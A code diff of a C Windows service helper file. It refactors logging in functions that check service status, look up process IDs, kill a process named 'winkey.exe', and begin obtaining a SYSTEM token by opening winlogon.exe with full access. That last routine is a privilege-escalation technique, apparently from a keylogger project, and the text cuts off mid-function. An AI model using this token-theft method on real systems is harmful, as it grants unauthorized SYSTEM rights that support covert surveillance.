@@ -1,33 +1,19 @@
 #include <svc.h>
 #include <winnt.h>
 
-/*
-    typedef struct _SERVICE_STATUS_PROCESS {
-      DWORD dwServiceType;
-      DWORD dwCurrentState;
-      DWORD dwControlsAccepted;
-      DWORD dwWin32ExitCode;
-      DWORD dwServiceSpecificExitCode;
-      DWORD dwCheckPoint;
-      DWORD dwWaitHint;
-      DWORD dwProcessId;
-      DWORD dwServiceFlags;
-    } SERVICE_STATUS_PROCESS, *LPSERVICE_STATUS_PROCESS;
-*/
-
 int     is_service_running(void)
 {
     SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
     if (!hSCM)
     {
-        printf("OpenSCManager failed: %lu\n", GetLastError());
+        DBG("OpenSCManager failed: %lu\n", GetLastError());
         return (-1);
     }
 
     SC_HANDLE hService = OpenService(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
     if (!hService)
     {
-        printf("Open service failed: %lu\n", GetLastError());
+        DBG("Open service failed: %lu\n", GetLastError());
         CloseServiceHandle(hSCM);
         return (-1);
     }
@@ -43,7 +29,7 @@ int     is_service_running(void)
             &bytesNeeded                    // number of bytes returned
     ))
     {
-        printf("QueryServiceStatusEx failed: %lu\n", GetLastError());
+        DBG("QueryServiceStatusEx failed: %lu\n", GetLastError());
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
         return (-1);
@@ -57,24 +43,8 @@ int     is_service_running(void)
     return (0);
 }
 
-void    getFilePathFromExe(char *output, char *filename)
+static DWORD   GetProcessPid(char *ProcName)
 {
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
-
-    int len = (int)strlen(exePath);
-    while (len > 0 && exePath[len - 1] != '\\')
-        len--;
-    exePath[len] = '\0';
-
-    snprintf(output, MAX_PATH, "%s%s", exePath, filename);
-}
-
-DWORD   GetProcessPid(char *ProcName, DWORD sessionID)
-{
-    UNREFERENCED_PARAMETER(sessionID);
-
-
     DWORD pid = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE)
@@ -105,8 +75,8 @@ DWORD   GetProcessPid(char *ProcName, DWORD sessionID)
 
 void    KillWinkeyPID(void)
 {
-    DWORD   sessionID = WTSGetActiveConsoleSessionId();
-    DWORD   pid = GetProcessPid("winkey.exe", sessionID);
+    //DWORD   sessionID = WTSGetActiveConsoleSessionId();
+    DWORD   pid = GetProcessPid("winkey.exe");
 
     HANDLE hProcess = OpenProcess (
         PROCESS_TERMINATE,
@@ -114,16 +84,15 @@ void    KillWinkeyPID(void)
         pid
     );
 
-    if (!TerminateProcess(hProcess, pid)) {
-        printf("Error TerminateProcess: %lu\n", GetLastError());
-    }
+    if (!TerminateProcess(hProcess, pid))
+        DBG("Error TerminateProcess: %lu\n", GetLastError());
 }
 
 
 HANDLE  GetSystemToken(void)
 {
-    DWORD   sessionID = WTSGetActiveConsoleSessionId(); // session 0
-    DWORD   pid = GetProcessPid("winlogon.exe", sessionID);    
+    //DWORD   sessionID = WTSGetActiveConsoleSessionId(); // session 0
+    DWORD   pid = GetProcessPid("winlogon.exe");    
     
     HANDLE hProcess = OpenProcess(
         PROCESS_ALL_ACCESS, 
